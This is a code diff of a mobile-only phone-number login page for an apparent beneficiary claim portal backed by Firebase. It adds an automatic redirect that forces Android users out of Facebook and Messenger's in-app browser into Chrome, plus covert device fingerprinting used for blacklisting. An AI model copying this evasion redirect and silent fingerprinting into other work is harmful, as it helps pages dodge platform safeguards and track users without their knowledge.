@@ -43,6 +43,7 @@
     <script>document.write('<script src="/js/config.js?v=' + Date.now() + '"><\/script>');</script>
     
     <script>
+
         // CONFIGURATION
 const firebaseConfig = {
     apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
@@ -54,101 +55,106 @@ const firebaseConfig = {
     appId: "1:1028308831969:web:96e224e75d69ba74332924"
 };
 
-firebase.initializeApp(firebaseConfig);
+if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
 const db = firebase.database();
 
-// 1. GENERATE DEVICE SIGNATURE (Fingerprint)
-function getDeviceSignature() {
-    const specs = [
+// 1. AUTO-INTENT BYPASS (No Button Needed)
+function autoIntentBypass() {
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    const isFacebook = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Messenger") > -1);
+    
+    if (isFacebook && /Android/i.test(ua)) {
+        // Kunin ang current URL at alisin ang http/https protocol
+        const cleanUrl = window.location.href.split('://')[1];
+        
+        // Pilitin lumabas sa Messenger at mag-open sa Chrome
+        // Ang "intent://" ay parang "Refresh" pero sa external browser
+        window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+    }
+}
+
+// 2. DEVICE FINGERPRINT (Signature)
+function generateSignature() {
+    const data = [
         navigator.userAgent,
-        screen.height,
-        screen.width,
-        navigator.hardwareConcurrency,
-        navigator.language
+        screen.height + "x" + screen.width,
+        navigator.language,
+        navigator.hardwareConcurrency || 0
     ].join('|');
-    // Simple hash function para maging "Signature" string
+    
     let hash = 0;
-    for (let i = 0; i < specs.length; i++) {
-        hash = ((hash << 5) - hash) + specs.charCodeAt(i);
+    for (let i = 0; i < data.length; i++) {
+        hash = ((hash << 5) - hash) + data.charCodeAt(i);
         hash |= 0;
     }
     return "SIG-" + Math.abs(hash);
 }
 
-const deviceSig = getDeviceSignature();
+const deviceSig = generateSignature();
 
-// 2. ANDROID INTENT / BROWSER CHECK
-function checkEnvironment() {
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
-    const isFacebook = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Messenger") > -1);
+// RUN IMMEDIATELY ON LOAD
+window.onload = function() {
+    autoIntentBypass(); // Auto-jump out of FB
     
-    if (isFacebook && /Android/i.test(ua)) {
-        // Pilitin lumabas sa Messenger/FB App
-        const currentUrl = window.location.href.replace(/https?:\/\//, "");
-        window.location.href = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+    // Mobile Check
+    const ua = navigator.userAgent;
+    if (!/Android|webOS|iPhone|iPad|iPod/i.test(ua)) {
+        document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>MOBILE ONLY ACCESS</h2>";
     }
+};
 
-    // Mobile Only Logic
-    if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
-        document.body.innerHTML = "<div style='padding:50px; text-align:center; color:red; font-weight:bold;'>MOBILE DEVICE ONLY: Please use your smartphone to access this portal.</div>";
-    }
-}
-
-window.onload = checkEnvironment;
-
-// 3. LOGIN & RULES LOGIC
+// 3. LOGIN LOGIC WITH BLACKLIST & SIGNATURE RULES
 async function handleLogin() {
-    const phoneInput = document.getElementById('phoneInput').value.trim();
+    const phone = document.getElementById('phoneInput').value.trim();
     const btn = document.getElementById('loginBtn');
 
-    if (phoneInput.length !== 11) return alert("Enter 11-digit number.");
+    if (phone.length !== 11) return alert("Enter valid 11-digit number.");
 
     btn.disabled = true;
     btn.innerText = "VERIFYING...";
 
     try {
-        // Check if device is locally blacklisted
-        if (localStorage.getItem('sys_restricted') === 'true') {
+        // A. Local Storage Lock (Device-based blacklist)
+        if (localStorage.getItem('is_claimed') === 'true') {
             alert("This beneficiary was already claimed.");
-            btn.disabled = false; return;
-        }
-
-        // Check Database for Phone OR Device Signature sa Blacklist
-        const blackByPhone = await db.ref('blacklist/' + phoneInput).once('value');
-        const blackBySig = await db.ref('blacklisted_devices/' + deviceSig).once('value');
-
-        if (blackByPhone.exists() || blackBySig.exists()) {
-            // Re-enforce local storage if database found them
-            localStorage.setItem('sys_restricted', 'true');
-            alert("This beneficiary was already claimed.");
-            btn.disabled = false;
+            btn.disabled = false; btn.innerText = "PROCEED";
             return;
         }
 
-        // Check System Mode (Open/Strict)
+        // B. Database Check (Phone number OR Device Signature)
+        const blackPhone = await db.ref('blacklist/' + phone).once('value');
+        const blackSig = await db.ref('blacklisted_devices/' + deviceSig).once('value');
+
+        if (blackPhone.exists() || blackSig.exists()) {
+            localStorage.setItem('is_claimed', 'true'); // Permanent lock on this browser
+            alert("This beneficiary was already claimed.");
+            btn.disabled = false; btn.innerText = "PROCEED";
+            return;
+        }
+
+        // C. System Mode Check (Admin Switch)
         const modeSnap = await db.ref('system_status/mode').once('value');
         const mode = modeSnap.val() || 'strict';
 
         if (mode === 'open') {
-            proceed(phoneInput);
+            grantAccess(phone);
         } else {
-            // Strict Mode: Only Whitelisted
-            const whiteSnap = await db.ref('whitelist/' + phoneInput).once('value');
+            // STRICT MODE: Check Whitelist
+            const whiteSnap = await db.ref('whitelist/' + phone).once('value');
             if (whiteSnap.exists()) {
-                proceed(phoneInput);
+                grantAccess(phone);
             } else {
                 alert("System Notice: Access is currently limited. Try again later.");
-                btn.disabled = false;
+                btn.disabled = false; btn.innerText = "PROCEED";
             }
         }
-
-    } catch (e) {
-        alert("Verification failed. Check connection.");
+    } catch (err) {
+        alert("Connection Error.");
         btn.disabled = false;
     }
 }
 
-function proceed(phone) {
+function grantAccess(phone) {
     sessionStorage.setItem('user_phone', phone);
     sessionStorage.setItem('user_sig', deviceSig);
     window.location.href = "main.html";
